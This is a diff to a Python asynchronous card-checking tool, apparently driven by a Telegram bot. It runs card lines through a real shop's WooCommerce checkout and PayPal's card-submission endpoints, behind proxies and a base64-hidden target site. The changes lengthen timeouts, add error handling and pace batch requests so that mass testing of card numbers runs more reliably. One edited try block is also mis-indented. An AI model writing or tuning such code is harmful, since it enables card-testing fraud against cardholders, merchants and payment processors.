@@ -338,10 +338,21 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
         corr = generate_random_code()
         sess = generate_random_code()
         
-        # Use faster timeout for better performance
-        timeout = aiohttp.ClientTimeout(total=15, connect=5)
-        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+        # Use more generous timeouts to match pp.py behavior
+        timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=30)
+        connector = aiohttp.TCPConnector(
+            limit=100, 
+            limit_per_host=30,
+            ttl_dns_cache=300,
+            use_dns_cache=True,
+            keepalive_timeout=30,
+            enable_cleanup_closed=True
+        )
+        async with aiohttp.ClientSession(
+            timeout=timeout, 
+            connector=connector,
+            headers={'User-Agent': user}
+        ) as session:
 
             # Encoded site URL to prevent leaking
             encoded_site = base64.b64decode('c3dpdGNodXBjYi5jb20=').decode('utf-8')
@@ -364,12 +375,14 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             }
             
             try:
-                async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)) as response:
+                async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                     if response.status != 200:
                         logger.warning(f"Add to cart failed with status {response.status}")
                     await response.text()
             except asyncio.TimeoutError:
                 logger.warning("Add to cart timeout")
+            except Exception as e:
+                logger.warning(f"Add to cart error: {str(e)}")
 
             # Step 2: Go to checkout - optimized
             headers = {
@@ -379,12 +392,14 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             }
             
             try:
-                async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)) as response:
+                async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                     if response.status != 200:
                         raise Exception(f"Checkout page failed with status {response.status}")
                     checkout_text = await response.text()
             except asyncio.TimeoutError:
                 raise Exception("Checkout page timeout")
+            except Exception as e:
+                raise Exception(f"Checkout page error: {str(e)}")
 
             # Extract tokens with better error handling
             try:
@@ -415,8 +430,11 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             params = {'wc-ajax': 'update_order_review'}
             data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
             
-            async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy) as response:
-                await response.text()
+            try:
+                async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
+                    await response.text()
+            except Exception as e:
+                logger.warning(f"Update order review error: {str(e)}")
 
             # Step 4: Create PayPal order
             headers = {
@@ -451,8 +469,11 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'save_payment_method': False,
             }
             
-            async with session.post(site_url, params=params, headers=headers, json=json_data, proxy=proxy) as response:
-                paypal_response = await response.json()
+            try:
+                async with session.post(site_url, params=params, headers=headers, json=json_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
+                    paypal_response = await response.json()
+            except Exception as e:
+                raise Exception(f"PayPal order creation error: {str(e)}")
                 
             id = paypal_response['data']['id']
             pcp = paypal_response['data']['custom_id']
@@ -494,8 +515,11 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'token': id,
             }
             
-            async with session.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxy=proxy) as response:
+            try:
+            async with session.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=60)) as response:
                 await response.text()
+        except Exception as e:
+            logger.warning(f"PayPal card fields error: {str(e)}")
 
             # Step 6: Submit payment
             headers = {
@@ -612,13 +636,17 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             }
             
             # Use aiohttp for final payment request
-            async with session.post(
-                'https://www.paypal.com/graphql?fetch_credit_form_submit',
-                headers=headers,
-                json=json_data,
-                proxy=proxy
-            ) as response:
-                last = await response.text()
+            try:
+                async with session.post(
+                    'https://www.paypal.com/graphql?fetch_credit_form_submit',
+                    headers=headers,
+                    json=json_data,
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=30)
+                ) as response:
+                    last = await response.text()
+            except Exception as e:
+                raise Exception(f"Payment submission error: {str(e)}")
         
         # Get BIN info asynchronously with timeout for better performance
         try:
@@ -1481,10 +1509,13 @@ async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         async with semaphore:
                             return await check_single_card_async(card, user_info)
                     
-                    # Create tasks for all cards
-                    for card in valid_cards:
+                    # Create tasks for all cards with delay to prevent overwhelming
+                    for i, card in enumerate(valid_cards):
                         task = asyncio.create_task(check_card_with_semaphore(card))
                         tasks.append(task)
+                        # Add small delay between task creation to prevent connection flooding
+                        if i > 0 and i % 3 == 0:
+                            await asyncio.sleep(0.5)
                     
                     # Process results as they complete
                     for task in asyncio.as_completed(tasks):
